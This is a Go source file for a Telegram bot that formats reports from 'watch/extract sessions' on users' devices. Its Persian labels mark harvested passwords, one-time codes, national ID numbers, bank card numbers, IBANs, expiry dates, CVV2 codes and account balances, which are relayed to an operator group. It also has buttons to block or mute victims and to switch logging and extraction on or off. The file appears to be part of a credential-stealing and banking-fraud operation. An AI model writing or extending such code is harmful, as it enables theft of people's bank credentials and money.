package telegram

import (
	"crypto/sha256"
	"encoding/hex"
	"html"
	"strings"
	"unicode/utf8"

	"github.com/base/realtime/internal/protocol"
)

type WatchExtractNotice struct {
	AppLabel        string
	Package         string
	PortName        string
	PortDescription string
	PortCode        string
	UserName        string
	UserDescription string
	UserID          string
	SetToken        string
	Reply           string
	Items           []protocol.WatchExtractItem
	ExtractError    string
}

func WatchExtractHTML(n WatchExtractNotice) string {
	app := strings.TrimSpace(n.AppLabel)
	if app == "" {
		app = strings.TrimSpace(n.Package)
	}
	if app == "" {
		app = "برنامه"
	}
	lines := []string{
		"🔎 <b>نشست رصد</b>",
		"",
		field("برنامه", app),
	}
	if pkg := strings.TrimSpace(n.Package); pkg != "" && pkg != app {
		lines = append(lines, field("پکیج", pkg))
	}
	for _, line := range []string{
		field("نام پورت", n.PortName),
		fieldOpt("توضیحات پورت", n.PortDescription),
		field("کد پورت", n.PortCode),
		field("نام کاربر", n.UserName),
		fieldOpt("توضیحات کاربر", n.UserDescription),
		field("شناسه کاربر", n.UserID),
	} {
		if line != "" {
			lines = append(lines, line)
		}
	}
	if token := strings.TrimSpace(n.SetToken); token != "" {
		lines = append(lines, "<b>دستور تنظیم</b>:", "<code>/set_"+html.EscapeString(token)+"</code>")
	}
	if errMsg := strings.TrimSpace(n.ExtractError); errMsg != "" {
		lines = append(lines, "", "⚠️ <b>استخراج نشد</b>", html.EscapeString(clipTelegram(errMsg, 280)))
		return clipTelegram(strings.Join(lines, "\n"), 4000)
	}
	reply := strings.TrimSpace(n.Reply)
	if reply != "" {
		lines = append(lines, "", html.EscapeString(clipTelegram(reply, 900)))
	}
	for _, item := range n.Items {
		label := strings.TrimSpace(item.Label)
		value := strings.TrimSpace(item.Value)
		if label == "" || value == "" {
			continue
		}
		title := label
		if owner := strings.TrimSpace(item.Owner); owner != "" && label == "کارت" {
			title = label + " · " + owner
		}
		if item.Own && label == "کارت" {
			title = "🟢⭐️ " + title
		}
		lines = append(lines, "", "<b>"+html.EscapeString(title)+"</b>", "<code>\u200E"+html.EscapeString(clipTelegram(value, 280))+"</code>")
	}
	return clipTelegram(strings.Join(lines, "\n"), 4000)
}

// WatchLoginOK reports a successful-login extract reply (starts with ✅).
func WatchLoginOK(reply string) bool {
	ok, _ := WatchLoginOutcome(reply)
	return ok
}

// WatchLoginOutcome parses the extract reply header: ✅ success, ⚠️ not success.
func WatchLoginOutcome(reply string) (success bool, known bool) {
	r := strings.TrimSpace(reply)
	if r == "" {
		return false, false
	}
	if strings.HasPrefix(r, "✅") {
		return true, true
	}
	if strings.HasPrefix(r, "⚠️") || strings.HasPrefix(r, "⚠") {
		return false, true
	}
	return false, false
}

// WatchPortLoginHTML is a short success notice for the port Telegram group.
// Only app/user identity plus موجودی when present — no passwords or cards.
func WatchPortLoginHTML(appLabel, packageName, userName, userID, balance string) string {
	app := strings.TrimSpace(appLabel)
	if app == "" {
		app = strings.TrimSpace(packageName)
	}
	if app == "" {
		app = "برنامه"
	}
	lines := []string{"✅ <b>ورود موفق</b>", "", field("برنامه", app)}
	if name := strings.TrimSpace(userName); name != "" {
		lines = append(lines, field("کاربر", name))
	}
	if id := strings.TrimSpace(userID); id != "" {
		lines = append(lines, field("شناسه", id))
	}
	if bal := strings.TrimSpace(balance); bal != "" {
		lines = append(lines, field("موجودی", bal))
	}
	return clipTelegram(strings.Join(lines, "\n"), 800)
}

// WatchExtractBalance returns the first موجودی value from extract items.
func WatchExtractBalance(items []protocol.WatchExtractItem) string {
	for _, item := range items {
		if strings.TrimSpace(item.Label) != "موجودی" {
			continue
		}
		if v := strings.TrimSpace(item.Value); v != "" {
			return v
		}
	}
	return ""
}

// WatchExtractWorthLogging is true when extract produced at least one important copyable fact.
func WatchExtractWorthLogging(items []protocol.WatchExtractItem) bool {
	for _, item := range items {
		label := strings.TrimSpace(item.Label)
		value := strings.TrimSpace(item.Value)
		if label == "" || value == "" {
			continue
		}
		switch label {
		case "نام کاربری", "رمز", "رمز درست", "رمز نادرست", "کد یکبارمصرف", "رمز دوم",
			"کد ملی", "تاریخ تولد", "شماره", "کارت", "شبا", "ایمیل", "موجودی", "تاریخ انقضا", "CVV2":
			return true
		}
	}
	return false
}

func WatchPackageKey(pkg string) string {
	sum := sha256.Sum256([]byte(strings.TrimSpace(pkg)))
	return hex.EncodeToString(sum[:4])
}

func WatchSessionURL(botUsername, setToken, deviceID string) string {
	user := strings.TrimPrefix(strings.TrimSpace(botUsername), "@")
	token := strings.TrimSpace(setToken)
	deviceID = strings.TrimSpace(deviceID)
	if user == "" || token == "" || deviceID == "" {
		return ""
	}
	return "https://t.me/" + user + "?startapp=ws_" + token + "_" + deviceID
}

type WatchKeyboardState struct {
	SkipLog     bool
	SkipExtract bool
	Blocked     bool
	Muted       bool
}

func WatchExtractKeyboard(botUsername, setToken, deviceID, pkg, appLabel string, state WatchKeyboardState) map[string]any {
	token := strings.TrimSpace(setToken)
	pkg = strings.TrimSpace(pkg)
	if token == "" {
		return nil
	}
	app := strings.TrimSpace(appLabel)
	if app == "" {
		app = strings.TrimSpace(pkg)
	}
	if app == "" {
		app = "برنامه"
	}
	rows := make([]any, 0, 5)
	sessionURL := WatchSessionURL(botUsername, token, deviceID)
	manageURL := InstallManageURL(botUsername, token)
	top := make([]any, 0, 2)
	if sessionURL != "" {
		top = append(top, map[string]any{"text": "📂 نشست", "url": sessionURL})
	}
	if manageURL != "" {
		top = append(top, map[string]any{"text": ManageUserButtonText, "url": manageURL})
	}
	if len(top) > 0 {
		rows = append(rows, top)
	}
	ref := ""
	if pkg != "" {
		ref = watchPkgRef(token, pkg)
	}
	if ref != "" {
		logLabel := watchAppButton("📋 معاف لاگ", app, "برای کاربر")
		if state.SkipLog {
			logLabel = watchAppButton("✅ فعال لاگ", app, "برای کاربر")
		}
		extractLabel := watchAppButton("🤖 معاف استخراج", app, "برای کاربر")
		if state.SkipExtract {
			extractLabel = watchAppButton("✅ فعال استخراج", app, "برای کاربر")
		}
		rows = append(rows,
			[]any{map[string]any{"text": logLabel, "callback_data": "wl:" + token + ":" + ref}},
			[]any{map[string]any{"text": extractLabel, "callback_data": "we:" + token + ":" + ref}},
		)
	}
	blockLabel := "🚫 بلاک کاربر"
	if state.Blocked {
		blockLabel = "✅ رفع بلاک کاربر"
	}
	muteLabel := "🔇 بی‌صدا کردن کاربر"
	if state.Muted {
		muteLabel = "🔊 صدا دار کردن کاربر"
	}
	blockData := "wb:" + token
	muteData := "wm:" + token
	if ref != "" {
		blockData += ":" + ref
		muteData += ":" + ref
	}
	rows = append(rows,
		[]any{map[string]any{"text": blockLabel, "callback_data": blockData}},
		[]any{map[string]any{"text": muteLabel, "callback_data": muteData}},
	)
	return map[string]any{"inline_keyboard": rows}
}

// watchAppButton builds "prefix 📱 app 📱 suffix" within Telegram's 64-char button limit.
func watchAppButton(prefix, app, suffix string) string {
	app = strings.TrimSpace(app)
	if app == "" {
		app = "برنامه"
	}
	const max = 64
	join := func(name string) string {
		return strings.TrimSpace(prefix + " 📱 " + name + " 📱 " + suffix)
	}
	label := join(app)
	if utf8.RuneCountInString(label) <= max {
		return label
	}
	overhead := utf8.RuneCountInString(prefix) + utf8.RuneCountInString(suffix) + utf8.RuneCountInString(" 📱  📱 ") 
	keep := max - overhead
	if keep < 4 {
		return string([]rune(label)[:max])
	}
	runes := []rune(app)
	if len(runes) > keep {
		app = string(runes[:keep-1]) + "…"
	}
	return join(app)
}

// watchPkgRef is the package name when it fits Telegram callback_data (64 bytes), else an 8-hex hash.
func watchPkgRef(setToken, pkg string) string {
	pkg = strings.TrimSpace(pkg)
	if pkg == "" {
		return ""
	}
	if len("wl:")+len(setToken)+1+len(pkg) <= 64 {
		return pkg
	}
	return WatchPackageKey(pkg)
}

func clipTelegram(value string, max int) string {
	value = strings.TrimSpace(value)
	if max <= 0 || utf8.RuneCountInString(value) <= max {
		return value
	}
	return string([]rune(value)[:max])
}
